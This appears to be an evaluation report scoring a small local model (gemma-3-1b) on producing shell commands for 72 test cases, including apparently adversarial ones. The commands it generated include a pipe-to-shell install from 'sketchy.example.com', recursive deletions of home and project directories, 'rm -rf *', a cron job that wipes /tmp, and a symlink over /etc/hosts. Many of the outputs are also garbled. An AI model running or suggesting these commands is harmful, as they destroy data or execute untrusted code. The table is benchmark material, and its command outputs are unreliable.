# eval: llama-server / google_gemma-3-1b-it-Q4_K_M.gguf (gemma3-1b)
- mode: schema · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 24/72 (33%)
- cold p50 1707ms p95 2314ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✗ | 1821 | - | brew ; brew |
| u02 | ✓ | 1407 | - | ls -l |
| u03 | ✗ | 1773 | - | ifconfig ; ip |
| u04 | ✗ | 2132 | - | sudo netstat -tulnp | grep 3000 ; sudo kill 3000 |
| u05 | ✗ | 1370 | - | df |
| u06 | ✗ | 1559 | - | find / -name '*.log' -mtime -1 |
| u07 | ✗ | 1430 | - | ps aux |
| u08 | ✓ | 1774 | - | git status ; git branch |
| u09 | ✓ | 1503 | - | brew install ripgrep |
| u10 | ✓ | 1849 | - | mkdir projects ; cd projects |
| u11 | ✗ | 1924 | - | tar ; gzip |
| u12 | ✗ | 1336 | - | echo |
| u13 | ✗ | 1528 | - | kill -9 8080 |
| u14 | ✗ | 1509 | - | journalctl -k -1 |
| u15 | ✗ | 1395 | - | python3 --version |
| u16 | ✓ | 1777 | - | brew update ; brew sort |
| u17 | ✗ | 1382 | - | ls |
| u18 | ✗ | 2311 | - | git reset --hard HEAD ; git checkout -a ; git reset --hard HEAD |
| u19 | ✗ | 2307 | - | - |
| u20 | ✗ | 1805 | - | top ; free -m |
| u21 | ✗ | 1744 | - | find /Users/hridyaagrawal/lexis-eval/lexis -name '*.js' -type f -print0 | xargs  |
| u22 | ✗ | 1707 | - | brew ; brew |
| u23 | ✓ | 1902 | - | chmod +x script.sh ; ./script.sh |
| u24 | ✗ | 1517 | - | grep "TODO" /Users/hridyaagrawal/lexis/src/* |
| u25 | ✗ | 2045 | - | curl -L https://example.com/file.zip | tar -xf - ; mv ~/Downloads ~/Downloads/fi |
| u26 | ✗ | 1802 | - | vmstat ; sysctl |
| u27 | ✗ | 2320 | - | - |
| u28 | ✓ | 1455 | - | rm -rf node_modules |
| u29 | ✗ | 1358 | - | network |
| u30 | ✗ | 1769 | - | unzip ; cd |
| u31 | ✗ | 1391 | - | zsh |
| u32 | ✗ | 1354 | - | uptime |
| u33 | ✗ | 2092 | - | ls -a ; grep -r 'config' /Users/hridyaagrawal/lexis/zsh/zshrc |
| u34 | ✗ | 1329 | - | nslookup |
| u35 | ✗ | 1735 | - | cp ; mv |
| u36 | ✓ | 1408 | - | mv old.txt new.txt |
| u37 | ✗ | 1598 | - | ls -l /Users/hridyaagrawal/lexis-eval/lexis/Downloads |
| u38 | ✗ | 1426 | - | npm list -g --depth=0 |
| u39 | ✗ | 1348 | - | open |
| u40 | ✓ | 1425 | - | sudo dscacheutil -flushcache |
| a01 | ✓ | 1542 | - | rm -rf /Users/hridyaagrawal/lexis-eval/lexis |
| a02 | ✗ | 2305 | - | - |
| a03 | ✗ | 1840 | - | git |
| a04 | ✗ | 1617 | - | curl -s https://sketchy.example.com/install.sh | sh |
| a05 | ✗ | 1392 | - | killall |
| a06 | ✗ | 1770 | - | chmod ; 777 |
| a07 | ✓ | 2336 | - | xdotool --grab-focus ; xdotool --shift-focus ; killall zsh |
| a08 | ✗ | 2302 | - | - |
| a09 | ✗ | 2308 | - | - |
| a10 | ✓ | 1628 | - | find /var/log -type f -mtime +30 -delete |
| a11 | ✗ | 2319 | - | - |
| a12 | ✗ | 2146 | - | git ; git ; git |
| a13 | ✓ | 1353 | - | brew uninstall node |
| a14 | ✓ | 1317 | - | firewall |
| a15 | ✓ | 1384 | - | rm -rf ~/.temp_files |
| a16 | ✗ | 2314 | - | - |
| a17 | ✓ | 1463 | - | rm -rf /Users/hridyaagrawal/lexis |
| a18 | ✓ | 1746 | - | gpg ; echo |
| a19 | ✓ | 1614 | - | echo 'export PATH=$PATH:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin' |
| a20 | ✓ | 1939 | - | rm |
| u41 | ✗ | 2302 | - | - |
| u42 | ✓ | 1882 | - | touch my notes.txt ; echo 'hello world' |
| u43 | ✗ | 1910 | - | git log ; git show -s --limit=5 |
| u44 | ✓ | 1873 | - | curl https://example.com ; cat |
| u45 | ✗ | 1381 | - | ls |
| u46 | ✗ | 1356 | - | ifconfig |
| u47 | ✗ | 1767 | - | df ; du |
| u48 | ✗ | 1364 | - | who |
| a21 | ✗ | 1969 | - | crontab -e ; echo '0 0 * * * rm -rf /tmp' |
| a22 | ✓ | 1663 | - | ln -s /Users/hridyaagrawal/home/hosts /etc/hosts |
| a23 | ✓ | 1387 | - | rm -rf * |
| a24 | ✓ | 1383 | - | bash |
